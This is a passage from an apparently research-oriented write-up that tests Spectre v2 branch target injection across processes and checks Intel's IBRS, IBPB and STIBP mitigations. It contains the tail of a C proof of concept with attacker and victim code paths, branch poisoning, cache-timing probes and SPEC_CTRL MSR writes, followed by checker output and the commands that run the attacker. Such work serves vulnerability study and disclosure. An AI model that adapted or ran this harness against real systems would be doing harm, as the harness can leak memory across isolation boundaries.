</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>volatile</span> <span class=kt>uint8_t</span> <span class=n>d</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=n>tries</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=n>hits</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=n>totalHits</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=n>totalTries</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>jitForLoop</span><span class=p>(</span><span class=n>srcAddress</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#ifndef VICTIM
</span></span></span><span class=line><span class=cl><span class=cp></span>        <span class=nf>callGadget</span><span class=p>(</span><span class=n>srcAddress</span><span class=p>,</span> <span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>rdiPtr</span><span class=p>,</span> <span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span><span class=n>probeArray</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>#else
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#ifdef IBPB
</span></span></span><span class=line><span class=cl><span class=cp></span>        <span class=nf>wrmsr_on_cpu</span><span class=p>(</span><span class=mi>73</span><span class=p>,</span> <span class=n>cpu</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>100</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>d</span> <span class=o>=</span> <span class=o>*</span><span class=n>dstAddress</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nf>flush</span><span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>rdiPtr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nf>callGadget</span><span class=p>(</span><span class=n>srcAddress</span><span class=p>,</span> <span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>rdiPtr</span><span class=p>,</span> <span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span><span class=n>probeArray</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nf>probe</span><span class=p>(</span><span class=o>&amp;</span><span class=n>probeArray</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span> <span class=o>&lt;</span> <span class=n>THRESHOLD</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>hits</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>totalHits</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>totalTries</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>++</span><span class=n>tries</span> <span class=o>%</span> <span class=n>PRINT_AMMOUNT</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Rate: %u/%u  MSR[72]=%d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>hits</span><span class=p>,</span> <span class=n>tries</span><span class=p>,</span><span class=nf>rdmsr_on_cpu</span><span class=p>(</span><span class=n>IA32_SPEC_CTRL</span><span class=p>,</span><span class=n>cpu</span><span class=p>));</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=cp>#ifdef MSR
</span></span></span><span class=line><span class=cl><span class=cp></span>            <span class=nf>wrmsr_on_cpu</span><span class=p>(</span><span class=n>IA32_SPEC_CTRL</span><span class=p>,</span> <span class=n>cpu</span><span class=p>,</span> <span class=n>MSR_VAL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>            <span class=n>tries</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>hits</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>totalTries</span> <span class=o>&gt;=</span> <span class=n>PRINT_AMMOUNT</span> <span class=o>*</span> <span class=mi>10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nf>usleep</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Total misspredict rate: %d/%d (%.2f %)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>totalHits</span><span class=p>,</span> <span class=n>totalTries</span><span class=p>,</span> <span class=p>(</span><span class=kt>float</span><span class=p>)</span><span class=n>totalHits</span> <span class=o>*</span> <span class=mi>100</span> <span class=o>/</span> <span class=p>(</span><span class=kt>float</span><span class=p>)</span><span class=n>totalTries</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>srcAddress</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>dstAddress</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>cpu</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Usage:   %s &lt;srcAddress&gt; &lt;dstAddress&gt; &lt;cpuCore&gt; </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Example: %s 0x55555554123 0x55555555345 1 </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>srcAddress</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint64_t</span><span class=p>)</span><span class=nf>strtoull</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>16</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>dstAddress</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint64_t</span><span class=p>)</span><span class=nf>strtoull</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>16</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>cpu</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint64_t</span><span class=p>)</span><span class=nf>strtoull</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>3</span><span class=p>],</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>16</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>SetCoreAffinity</span><span class=p>(</span><span class=n>cpu</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>rwx1</span> <span class=o>=</span> <span class=nf>requestMem</span><span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)(</span><span class=n>srcAddress</span> <span class=o>&amp;</span> <span class=p>(</span><span class=o>~</span><span class=mh>0xfffULL</span><span class=p>)),</span> <span class=mh>0x1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>rwx2</span> <span class=o>=</span> <span class=nf>requestMem</span><span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)(</span><span class=n>dstAddress</span> <span class=o>&amp;</span> <span class=p>(</span><span class=o>~</span><span class=mh>0xfffULL</span><span class=p>)),</span> <span class=mh>0x1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#ifdef PRCTL
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>prctl</span><span class=p>(</span><span class=n>PR_SET_SPECULATION_CTRL</span><span class=p>,</span> <span class=n>PR_SPEC_INDIRECT_BRANCH</span><span class=p>,</span> <span class=n>PR_SPEC_FORCE_DISABLE</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>perror</span><span class=p>(</span><span class=s>&#34;prctl&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;PRCTL GET value 0x%x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=nf>prctl</span><span class=p>(</span><span class=n>PR_GET_SPECULATION_CTRL</span><span class=p>,</span> <span class=n>PR_SPEC_INDIRECT_BRANCH</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#ifdef MSR
</span></span></span><span class=line><span class=cl><span class=cp></span>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;current value msr[%d]=%d on core %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>IA32_SPEC_CTRL</span><span class=p>,</span> <span class=nf>rdmsr_on_cpu</span><span class=p>(</span><span class=n>IA32_SPEC_CTRL</span><span class=p>,</span> <span class=n>cpu</span><span class=p>),</span> <span class=n>cpu</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>wrmsr_on_cpu</span><span class=p>(</span><span class=n>IA32_SPEC_CTRL</span><span class=p>,</span> <span class=n>cpu</span><span class=p>,</span> <span class=n>MSR_VAL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;writing msr[%d]=%d on core %d </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>IA32_SPEC_CTRL</span><span class=p>,</span> <span class=n>MSR_VAL</span><span class=p>,</span> <span class=n>cpu</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;current value msr[%d]=%d on core %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>IA32_SPEC_CTRL</span><span class=p>,</span> <span class=nf>rdmsr_on_cpu</span><span class=p>(</span><span class=n>IA32_SPEC_CTRL</span><span class=p>,</span> <span class=n>cpu</span><span class=p>),</span> <span class=n>cpu</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// set up leak gadget into position
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#ifdef VICTIM
</span></span></span><span class=line><span class=cl><span class=cp></span>    <span class=n>rdiPtr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span><span class=n>f1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>copyLeakGadget</span><span class=p>(</span><span class=n>dstAddress</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>#else
</span></span></span><span class=line><span class=cl><span class=cp></span>    <span class=n>rdiPtr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span><span class=n>dstAddress</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>copyRetGadget</span><span class=p>(</span><span class=n>dstAddress</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>    <span class=nf>poison</span><span class=p>(</span><span class=n>srcAddress</span><span class=p>,</span> <span class=n>dstAddress</span><span class=p>,</span> <span class=n>cpu</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#ifdef MSR
</span></span></span><span class=line><span class=cl><span class=cp></span>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;current value msr[%d]=%d on core %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>IA32_SPEC_CTRL</span><span class=p>,</span> <span class=nf>rdmsr_on_cpu</span><span class=p>(</span><span class=n>IA32_SPEC_CTRL</span><span class=p>,</span> <span class=n>cpu</span><span class=p>),</span> <span class=n>cpu</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=disclaimer>Disclaimer<a hidden class=anchor aria-hidden=true href=#disclaimer>#</a></h3><p>We have identified that the test code sometimes might produce false negatives (low misprediction rate). Retrying the execution can lead to greater misprediction rate values, indicating the vulnerability.</p><h2 id=control-test-setup-bare-metal>Control Test Setup (Bare Metal)<a hidden class=anchor aria-hidden=true href=#control-test-setup-bare-metal>#</a></h2><p>We used the spectre_meltdown_checker<sup id=fnref:14><a href=#fn:14 class=footnote-ref role=doc-noteref>14</a></sup> to verify the spectre v2 mitigations available for the machine used as control:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>sudo</span> <span class=o>./</span><span class=n>spectre</span><span class=o>-</span><span class=n>meltdown</span><span class=o>-</span><span class=n>checker</span><span class=o>.</span><span class=n>sh</span>
</span></span><span class=line><span class=cl><span class=n>Spectre</span> <span class=ow>and</span> <span class=n>Meltdown</span> <span class=n>mitigation</span> <span class=n>detection</span> <span class=k>tool</span> <span class=n>v0</span><span class=o>.</span><span class=mi>45</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Checking</span> <span class=k>for</span> <span class=n>vulnerabilities</span> <span class=n>on</span> <span class=n>current</span> <span class=n>system</span>
</span></span><span class=line><span class=cl><span class=n>Kernel</span> <span class=n>is</span> <span class=n>Linux</span> <span class=mf>5.15</span><span class=o>.</span><span class=mi>0</span><span class=o>-</span><span class=mi>56</span><span class=o>-</span><span class=n>generic</span> <span class=c1>#62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64</span>
</span></span><span class=line><span class=cl><span class=n>CPU</span> <span class=n>is</span> <span class=n>Intel</span><span class=p>(</span><span class=n>R</span><span class=p>)</span> <span class=n>Core</span><span class=p>(</span><span class=n>TM</span><span class=p>)</span> <span class=n>i7</span><span class=o>-</span><span class=mi>4790</span> <span class=n>CPU</span> <span class=err>@</span> <span class=mf>3.60</span><span class=n>GHz</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Hardware</span> <span class=n>check</span>
</span></span><span class=line><span class=cl><span class=o>*</span> <span class=n>Hardware</span> <span class=n>support</span> <span class=p>(</span><span class=n>CPU</span> <span class=n>microcode</span><span class=p>)</span> <span class=k>for</span> <span class=n>mitigation</span> <span class=n>techniques</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span> <span class=n>Indirect</span> <span class=n>Branch</span> <span class=n>Restricted</span> <span class=n>Speculation</span> <span class=p>(</span><span class=n>IBRS</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span> <span class=n>SPEC_CTRL</span> <span class=n>MSR</span> <span class=n>is</span> <span class=n>available</span><span class=p>:</span>  <span class=n>YES</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span> <span class=n>CPU</span> <span class=n>indicates</span> <span class=n>IBRS</span> <span class=n>capability</span><span class=p>:</span>  <span class=n>YES</span>  <span class=p>(</span><span class=n>SPEC_CTRL</span> <span class=n>feature</span> <span class=n>bit</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span> <span class=n>Indirect</span> <span class=n>Branch</span> <span class=n>Prediction</span> <span class=n>Barrier</span> <span class=p>(</span><span class=n>IBPB</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span> <span class=n>CPU</span> <span class=n>indicates</span> <span class=n>IBPB</span> <span class=n>capability</span><span class=p>:</span>  <span class=n>YES</span>  <span class=p>(</span><span class=n>SPEC_CTRL</span> <span class=n>feature</span> <span class=n>bit</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span> <span class=n>Single</span> <span class=ne>Thread</span> <span class=n>Indirect</span> <span class=n>Branch</span> <span class=n>Predictors</span> <span class=p>(</span><span class=n>STIBP</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span> <span class=n>SPEC_CTRL</span> <span class=n>MSR</span> <span class=n>is</span> <span class=n>available</span><span class=p>:</span>  <span class=n>YES</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span> <span class=n>CPU</span> <span class=n>indicates</span> <span class=n>STIBP</span> <span class=n>capability</span><span class=p>:</span>  <span class=n>YES</span>  <span class=p>(</span><span class=n>Intel</span> <span class=n>STIBP</span> <span class=n>feature</span> <span class=n>bit</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>...</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>*</span> <span class=n>CPU</span> <span class=n>vulnerability</span> <span class=n>to</span> <span class=n>the</span> <span class=n>speculative</span> <span class=n>execution</span> <span class=n>attack</span> <span class=n>variants</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span> <span class=n>Affected</span> <span class=n>by</span> <span class=n>CVE</span><span class=o>-</span><span class=mi>2017</span><span class=o>-</span><span class=mi>5753</span> <span class=p>(</span><span class=n>Spectre</span> <span class=n>Variant</span> <span class=mi>1</span><span class=p>,</span> <span class=n>bounds</span> <span class=n>check</span> <span class=n>bypass</span><span class=p>):</span>  <span class=n>YES</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span> <span class=n>Affected</span> <span class=n>by</span> <span class=n>CVE</span><span class=o>-</span><span class=mi>2017</span><span class=o>-</span><span class=mi>5715</span> <span class=p>(</span><span class=n>Spectre</span> <span class=n>Variant</span> <span class=mi>2</span><span class=p>,</span> <span class=n>branch</span> <span class=n>target</span> <span class=n>injection</span><span class=p>):</span>  <span class=n>YES</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>...</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>CVE</span><span class=o>-</span><span class=mi>2017</span><span class=o>-</span><span class=mi>5715</span> <span class=n>aka</span> <span class=s1>&#39;Spectre Variant 2, branch target injection&#39;</span>
</span></span><span class=line><span class=cl><span class=o>*</span> <span class=n>Mitigated</span> <span class=n>according</span> <span class=n>to</span> <span class=n>the</span> <span class=o>/</span><span class=n>sys</span> <span class=n>interface</span><span class=p>:</span>  <span class=n>YES</span>  <span class=p>(</span><span class=n>Mitigation</span><span class=p>:</span> <span class=n>Retpolines</span><span class=p>,</span> <span class=n>IBPB</span><span class=p>:</span> <span class=n>conditional</span><span class=p>,</span> <span class=n>IBRS_FW</span><span class=p>,</span> <span class=n>STIBP</span><span class=p>:</span> <span class=n>conditional</span><span class=p>,</span> <span class=n>RSB</span> <span class=n>filling</span><span class=p>,</span> <span class=n>PBRSB</span><span class=o>-</span><span class=n>eIBRS</span><span class=p>:</span> <span class=n>Not</span> <span class=n>affected</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>*</span> <span class=n>Mitigation</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span> <span class=n>Kernel</span> <span class=n>is</span> <span class=n>compiled</span> <span class=n>with</span> <span class=n>IBRS</span> <span class=n>support</span><span class=p>:</span>  <span class=n>YES</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span> <span class=n>IBRS</span> <span class=n>enabled</span> <span class=ow>and</span> <span class=n>active</span><span class=p>:</span>  <span class=n>YES</span>  <span class=p>(</span><span class=k>for</span> <span class=n>firmware</span> <span class=n>code</span> <span class=n>only</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span> <span class=n>Kernel</span> <span class=n>is</span> <span class=n>compiled</span> <span class=n>with</span> <span class=n>IBPB</span> <span class=n>support</span><span class=p>:</span>  <span class=n>YES</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span> <span class=n>IBPB</span> <span class=n>enabled</span> <span class=ow>and</span> <span class=n>active</span><span class=p>:</span>  <span class=n>YES</span>
</span></span><span class=line><span class=cl><span class=o>*</span> <span class=n>Mitigation</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span> <span class=n>Kernel</span> <span class=n>has</span> <span class=n>branch</span> <span class=n>predictor</span> <span class=n>hardening</span> <span class=p>(</span><span class=n>arm</span><span class=p>):</span>  <span class=n>NO</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span> <span class=n>Kernel</span> <span class=n>compiled</span> <span class=n>with</span> <span class=n>retpoline</span> <span class=n>option</span><span class=p>:</span>  <span class=n>YES</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span> <span class=n>Kernel</span> <span class=n>compiled</span> <span class=n>with</span> <span class=n>a</span> <span class=n>retpoline</span><span class=o>-</span><span class=n>aware</span> <span class=n>compiler</span><span class=p>:</span>  <span class=n>YES</span>  <span class=p>(</span><span class=n>kernel</span> <span class=n>reports</span> <span class=n>full</span> <span class=n>retpoline</span> <span class=n>compilation</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>&gt;</span> <span class=n>STATUS</span><span class=p>:</span>  <span class=n>NOT</span> <span class=n>VULNERABLE</span>  <span class=p>(</span><span class=n>Full</span> <span class=n>retpoline</span> <span class=o>+</span> <span class=n>IBPB</span> <span class=n>are</span> <span class=n>mitigating</span> <span class=n>the</span> <span class=n>vulnerability</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>...</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>&gt;</span> <span class=n>SUMMARY</span><span class=p>:</span> <span class=n>CVE</span><span class=o>-</span><span class=mi>2017</span><span class=o>-</span><span class=mi>5753</span><span class=p>:</span><span class=n>OK</span> <span class=n>CVE</span><span class=o>-</span><span class=mi>2017</span><span class=o>-</span><span class=mi>5715</span><span class=p>:</span><span class=n>OK</span> <span class=n>CVE</span><span class=o>-</span><span class=mi>2017</span><span class=o>-</span><span class=mi>5754</span><span class=p>:</span><span class=n>OK</span> <span class=n>CVE</span><span class=o>-</span><span class=mi>2018</span><span class=o>-</span><span class=mi>3640</span><span class=p>:</span><span class=n>OK</span> <span class=n>CVE</span><span class=o>-</span><span class=mi>2018</span><span class=o>-</span><span class=mi>3639</span><span class=p>:</span><span class=n>OK</span> <span class=n>CVE</span><span class=o>-</span><span class=mi>2018</span><span class=o>-</span><span class=mi>3615</span><span class=p>:</span><span class=n>OK</span> <span class=n>CVE</span><span class=o>-</span><span class=mi>2018</span><span class=o>-</span><span class=mi>3620</span><span class=p>:</span><span class=n>OK</span> <span class=n>CVE</span><span class=o>-</span><span class=mi>2018</span><span class=o>-</span><span class=mi>3646</span><span class=p>:</span><span class=n>OK</span> <span class=n>CVE</span><span class=o>-</span><span class=mi>2018</span><span class=o>-</span><span class=mi>12126</span><span class=p>:</span><span class=n>OK</span> <span class=n>CVE</span><span class=o>-</span><span class=mi>2018</span><span class=o>-</span><span class=mi>12130</span><span class=p>:</span><span class=n>OK</span> <span class=n>CVE</span><span class=o>-</span><span class=mi>2018</span><span class=o>-</span><span class=mi>12127</span><span class=p>:</span><span class=n>OK</span> <span class=n>CVE</span><span class=o>-</span><span class=mi>2019</span><span class=o>-</span><span class=mi>11091</span><span class=p>:</span><span class=n>OK</span> <span class=n>CVE</span><span class=o>-</span><span class=mi>2019</span><span class=o>-</span><span class=mi>11135</span><span class=p>:</span><span class=n>OK</span> <span class=n>CVE</span><span class=o>-</span><span class=mi>2018</span><span class=o>-</span><span class=mi>12207</span><span class=p>:</span><span class=n>OK</span> <span class=n>CVE</span><span class=o>-</span><span class=mi>2020</span><span class=o>-</span><span class=mi>0543</span><span class=p>:</span><span class=n>OK</span>
</span></span></code></pre></td></tr></table></div></div><p>This shows that the CPU has support for IBRS, IBPB and STIBP.</p><p>All the executed tests run the attacker process on core 0. The arguments <code>0x55555554123</code> and <code>0x55555555345</code> are just the source and the destination of the branch and are the same for the victim and the attacker. The third argument is the core to be pinned.</p><p>The MSR module (from msr-tools) must be loaded too.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ./attacker 0x55555554123 0x55555555345 0 &amp;
</span></span><span class=line><span class=cl>$ sudo modprobe msr
